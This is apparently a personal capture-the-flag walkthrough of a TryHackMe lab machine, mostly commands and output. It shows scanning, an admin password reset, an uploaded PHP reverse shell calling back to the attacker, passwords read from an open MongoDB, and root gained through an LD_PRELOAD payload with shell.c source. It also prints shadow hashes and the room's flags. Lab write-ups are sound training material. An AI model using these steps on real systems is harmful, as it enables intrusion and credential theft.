---
Inspired by a real-world pentesting engagement
---

![](https://tryhackme-images.s3.amazonaws.com/room-icons/86d73ce54a3f392bd56336da012a8270.png)

![](https://i.ibb.co/rQD7Rqt/road-banner.png)

### Submit Flags!

 Start Machine

As usual, obtain the user and root flag.

Answer the questions below

```bash
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.38.167 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.38.167:22
Open 10.10.38.167:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-26 12:48 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:48
Completed NSE at 12:48, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:48
Completed NSE at 12:48, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:48
Completed NSE at 12:48, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 12:48
Completed Parallel DNS resolution of 1 host. at 12:48, 0.03s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:48
Scanning 10.10.38.167 [2 ports]
Discovered open port 22/tcp on 10.10.38.167
Discovered open port 80/tcp on 10.10.38.167
Completed Connect Scan at 12:48, 0.20s elapsed (2 total ports)
Initiating Service scan at 12:48
Scanning 2 services on 10.10.38.167
Completed Service scan at 12:48, 6.44s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.38.167.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:48
Completed NSE at 12:48, 6.17s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:48
Completed NSE at 12:48, 0.80s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:48
Completed NSE at 12:48, 0.00s elapsed
Nmap scan report for 10.10.38.167
Host is up, received user-set (0.20s latency).
Scanned at 2023-02-26 12:48:45 EST for 14s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e6dc8869dea1738e845ba13e279f0724 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXhjztNjrxAn+QfSDb6ugzjCwso/WiGgq/BGXMrbqex9u5Nu1CKWtv7xiQpO84MsC2li6UkIAhWSMO0F//9odK1aRpPbH97e1ogBENN6YBP0s2z27aMwKh5UMyrzo5R42an3r6K+1x8lfrmW8VOOrvR4pZg9Mo+XNR/YU88P3XWq22DNPJqwtB3q4Sw6M/nxxUjd01kcbjwd1d9G+nuDNraYkA2T/OTHfp/xbhet9K6ccFHoi+A8r6aL0GV/qqW2pm4NdfgwKxM73VQzyolkG/+DFkZc+RCH73dYLEfVjMjTbZTA+19Zd2hlPJVtay+vOZr1qJ9ZUDawU7rEJgJ4hHDqlVjxX9Yv9SfFsw+Y0iwBfb9IMmevI3osNG6+2bChAtI2nUJv0g87I31fCbU5+NF8VkaGLz/sZrj5xFvyrjOpRnJW3djQKhk/Avfs2wkZ+GiyxBOZLetSDFvTAARmqaRqW9sjHl7w4w1+pkJ+dkeRsvSQlqw+AFX0MqFxzDF7M=
|   256 6bea185d8dc79e9a012cdd50c5f8c805 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNBLTibnpRB37eKji7C50xC9ujq7UyiFQSHondvOZOF7fZHPDn3L+wgNXEQ0wei6gzQfiZJmjQ5vQ88vEmCZzBI=
|   256 ef06d7e4b165156e9462ccddf08a1a24 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPv3g1IqvC7ol2xMww1gHLeYkyUIe8iKtEBXznpO25Ja
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-favicon: Unknown favicon MD5: FB0AA7D49532DA9D0006BA5595806138
|_http-title: Sky Couriers
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:48
Completed NSE at 12:48, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:48
Completed NSE at 12:48, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:48
Completed NSE at 12:48, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.73 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://10.10.38.167 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.38.167
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/02/26 12:52:18 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.38.167/assets               (Status: 301) [Size: 313] [--> http://10.10.38.167/assets/]
http://10.10.38.167/v2                   (Status: 301) [Size: 309] [--> http://10.10.38.167/v2/]
Progress: 16450 / 220561 (7.46%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2023/02/26 12:53:19 Finished
===============================================================

http://10.10.38.167/v2/admin/login.html

register

now login

http://10.10.38.167/v2/index.php

Select Profile Image
Upload file
Right now, only admin has access to this feature. Please drop an email to admin@sky.thm in case of any changes. 

http://10.10.38.167/v2/ResetUser.php

using burp

Request:
POST /v2/lostpassword.php HTTP/1.1
Host: 10.10.38.167
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------12254366598020492221331034755
Content-Length: 642
Origin: http://10.10.38.167
Connection: close
Referer: http://10.10.38.167/v2/ResetUser.php
Cookie: PHPSESSID=up59mf2kj8t8euojipfgoki6cj; Bookings=0; Manifest=0; Pickup=0; Delivered=0; Delay=0; CODINR=0; POD=0; cu=0
Upgrade-Insecure-Requests: 1
-----------------------------12254366598020492221331034755
Content-Disposition: form-data; name="uname"
admin@sky.thm
-----------------------------12254366598020492221331034755
Content-Disposition: form-data; name="npass"
witty
-----------------------------12254366598020492221331034755
Content-Disposition: form-data; name="cpass"
witty
-----------------------------12254366598020492221331034755
Content-Disposition: form-data; name="ci_csrf_token"
-----------------------------12254366598020492221331034755
Content-Disposition: form-data; name="send"
Submit
-----------------------------12254366598020492221331034755--

Response:
HTTP/1.1 200 OK
Date: Sun, 26 Feb 2023 18:00:37 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
refresh: 3;url=ResetUser.php
Content-Length: 37
Connection: close
Content-Type: text/html; charset=UTF-8
Password changed. 
Taking you back...

┌──(witty㉿kali)-[~/Downloads]
└─$ tail payload_ivan.php 
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('10.8.19.103', 1337);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>    

upload it then got to where it's uploaded

view-source:http://10.10.38.167/v2/profile.php

<!-- /v2/profileimages/ -->

http://10.10.38.167/v2/profileimages/payload_ivan.php

┌──(witty㉿kali)-[~]
└─$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.38.167] 53214
SOCKET: Shell has connected! PID: 1304
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@sky:/var/www/html/v2/profileimages$ cd /home/
cd /home/
www-data@sky:/home$ ls
ls
webdeveloper
www-data@sky:/home$ cd webdeveloper
cd webdeveloper
www-data@sky:/home/webdeveloper$ ls
ls
user.txt
www-data@sky:/home/webdeveloper$ cat user.txt
cat user.txt
63191e4ece37523c9fe6bb62a5e64d45

www-data@sky:/home/webdeveloper$ getent passwd
getent passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
webdeveloper:x:1000:1000:webdeveloper:/home/webdeveloper:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
mongodb:x:114:65534::/home/mongodb:/usr/sbin/nologin
root:x:0:0:root:/root:/bin/sh
nobody:x:65534:65534:nobody:/:/usr/sbin/nologin

The `getent` command is a Unix and Linux utility that is used to retrieve information from various databases, including the passwd database, group database, and network services databases. The `getent` command can be used to retrieve information from databases that are not stored in traditional text files, such as LDAP, NIS, and DNS.

For example, `getent passwd` retrieves all the user account information from the passwd database, and `getent group` retrieves all the group information from the group database.

www-data@sky:/home/webdeveloper$ ss -tulpn
ss -tulpn
Netid State  Recv-Q Send-Q      Local Address:Port    Peer Address:Port Process 
udp   UNCONN 0      0           127.0.0.53%lo:53           0.0.0.0:*            
udp   UNCONN 0      0       10.10.38.167%eth0:68           0.0.0.0:*            
tcp   LISTEN 0      70              127.0.0.1:33060        0.0.0.0:*            
tcp   LISTEN 0      511             127.0.0.1:9000         0.0.0.0:*            
tcp   LISTEN 0      4096            127.0.0.1:27017        0.0.0.0:*            
tcp   LISTEN 0      151             127.0.0.1:3306         0.0.0.0:*            
tcp   LISTEN 0      4096        127.0.0.53%lo:53           0.0.0.0:*            
tcp   LISTEN 0      128               0.0.0.0:22           0.0.0.0:*            
tcp   LISTEN 0      511                     *:80                 *:*            
tcp   LISTEN 0      128                  [::]:22              [::]:* 

ss is the command name in Linux systems that stands for "socket statistics."
`ss` is a Linux command that can be used to display detailed information about network sockets and connections. The `ss -tulpn` command specifically displays information about TCP sockets.

Here's what each option in the command means:

-   `-t`: displays information about TCP sockets
-   `-u`: displays information about UDP sockets
-   `-l`: shows listening sockets
-   `-p`: shows the process using the socket
-   `-n`: displays numeric IP addresses and port numbers

www-data@sky:/home/webdeveloper$ mongo 127.0.0.1
mongo 127.0.0.1
MongoDB shell version v4.4.6
connecting to: mongodb://127.0.0.1:27017/test?compressors=disabled&gssapiServiceName=mongodb
Implicit session: session { "id" : UUID("544ac835-ee71-4083-94ba-090580f30a19") }
MongoDB server version: 4.4.6
Welcome to the MongoDB shell.
For interactive help, type "help".
For more comprehensive documentation, see
	https://docs.mongodb.com/
Questions? Try the MongoDB Developer Community Forums
	https://community.mongodb.com
---
The server generated these startup warnings when booting: 
        2023-02-26T17:22:15.416+00:00: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine. See http://dochub.mongodb.org/core/prodnotes-filesystem
        2023-02-26T17:23:01.674+00:00: Access control is not enabled for the database. Read and write access to data and configuration is unrestricted
---
---
        Enable MongoDB's free cloud-based monitoring service, which will then receive and display
        metrics about your deployment (disk utilization, CPU, operation statistics, etc).

        The monitoring data will be available on a MongoDB website with a unique URL accessible to you
        and anyone you share the URL with. MongoDB may use this information to make product
        improvements and to suggest MongoDB products and deployment options to you.

        To enable free monitoring, run the following command: db.enableFreeMonitoring()
        To permanently disable this reminder, run the following command: db.disableFreeMonitoring()
---
> show dbs
shshow dbs
admin   0.000GB
backup  0.000GB
config  0.000GB
local   0.000GB
> use backup;
ususe backup;
switched to db backup
> shwo collections;
shshwo collections;
uncaught exception: SyntaxError: unexpected token: identifier :
@(shell):1:5
> show collections;
shshow collections;
collection
user
> db.user.find();
dbdb.user.find();
{ "_id" : ObjectId("60ae2661203d21857b184a76"), "Month" : "Feb", "Profit" : "25000" }
{ "_id" : ObjectId("60ae2677203d21857b184a77"), "Month" : "March", "Profit" : "5000" }
{ "_id" : ObjectId("60ae2690203d21857b184a78"), "Name" : "webdeveloper", "Pass" : "BahamasChapp123!@#" }
{ "_id" : ObjectId("60ae26bf203d21857b184a79"), "Name" : "Rohit", "EndDate" : "December" }
{ "_id" : ObjectId("60ae26d2203d21857b184a7a"), "Name" : "Rohit", "Salary" : "30000" }

www-data@sky:/home/webdeveloper$ su webdeveloper
su webdeveloper
Password: BahamasChapp123!@#

webdeveloper@sky:~$ sudo -l
sudo -l
Matching Defaults entries for webdeveloper on sky:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User webdeveloper may run the following commands on sky:
    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
┌──(witty㉿kali)-[~/Downloads]
└─$ cat shell.c 
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/bin/bash");
}

`LD_PRELOAD` is an environment variable in Linux and Unix-based operating systems that allows a user to override the dynamic linker/loader's default search path and preload a shared library before any other shared library. The specified library will be loaded into memory first, and any symbols defined in it will override those of the same name in subsequently loaded libraries.

webdeveloper@sky:~$ pwd
pwd
/home/webdeveloper
webdeveloper@sky:~$ ls
ls
user.txt
┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
webdeveloper@sky:~$ wget http://10.8.19.103:8080/shell.c
wget http://10.8.19.103:8080/shell.c
--2023-02-26 20:13:08--  http://10.8.19.103:8080/shell.c
Connecting to 10.8.19.103:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 198 [text/x-csrc]
Saving to: ‘shell.c’

shell.c             100%[===================>]     198  --.-KB/s    in 0s      

2023-02-26 20:13:08 (28.8 MB/s) - ‘shell.c’ saved [198/198]

webdeveloper@sky:~$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
webdeveloper@sky:~$ ls
ls
shell.c  shell.so  user.txt  wget-log
webdeveloper@sky:~$ sudo LD_PRELOAD=/home/webdeveloper/shell.so sky_backup_utility
<LOAD=/home/webdeveloper/shell.so sky_backup_utility
root@sky:/home/webdeveloper# cd /root
cd /root
root@sky:~# ls
ls
root.txt
root@sky:~# cat root.txt
cat root.txt
3a62d897c40a815ecbe267df2f533ac6
root@sky:~# getent shadow
getent shadow
root:$6$D8GdRREdfi4yvaze$3qCes0B6IQ/MdgU3VjvNBINrhH8vzjHb3k0YX6QalQNxdHD.Ece.LoNWnc4xzXElJeOFYXAvQv/N8ldxpRrgd0:18907:0:99999:7:::
daemon:*:18659:0:99999:7:::
bin:*:18659:0:99999:7:::
sys:*:18659:0:99999:7:::
sync:*:18659:0:99999:7:::
games:*:18659:0:99999:7:::
man:*:18659:0:99999:7:::
lp:*:18659:0:99999:7:::
mail:*:18659:0:99999:7:::
news:*:18659:0:99999:7:::
uucp:*:18659:0:99999:7:::
proxy:*:18659:0:99999:7:::
www-data:*:18659:0:99999:7:::
backup:*:18659:0:99999:7:::
list:*:18659:0:99999:7:::
irc:*:18659:0:99999:7:::
gnats:*:18659:0:99999:7:::
nobody:*:18659:0:99999:7:::
systemd-network:*:18659:0:99999:7:::
systemd-resolve:*:18659:0:99999:7:::
systemd-timesync:*:18659:0:99999:7:::
messagebus:*:18659:0:99999:7:::
syslog:*:18659:0:99999:7:::
_apt:*:18659:0:99999:7:::
tss:*:18659:0:99999:7:::
uuidd:*:18659:0:99999:7:::
tcpdump:*:18659:0:99999:7:::
landscape:*:18659:0:99999:7:::
pollinate:*:18659:0:99999:7:::
usbmux:*:18772:0:99999:7:::
sshd:*:18772:0:99999:7:::
systemd-coredump:!!:18772::::::
webdeveloper:$6$YSyMbUSLeGmMA09W$aatY7ldcbEDftJhl1RUlaCXd1OThl0n8HkZU5vCvd7EcmYQlED9RHkf13jh/UATFQstwTk5Mlnx66SWNZk.zT.:18773:0:99999:7:::
lxd:!:18772::::::
mysql:!:18772:0:99999:7:::
mongodb:*:18772:0:99999:7:::

```

![[Pasted image 20230226125734.png]]

What is the user.txt flag?  

*63191e4ece37523c9fe6bb62a5e64d45*

What is the root.txt flag?

*3a62d897c40a815ecbe267df2f533ac6*


[[Anonymous]]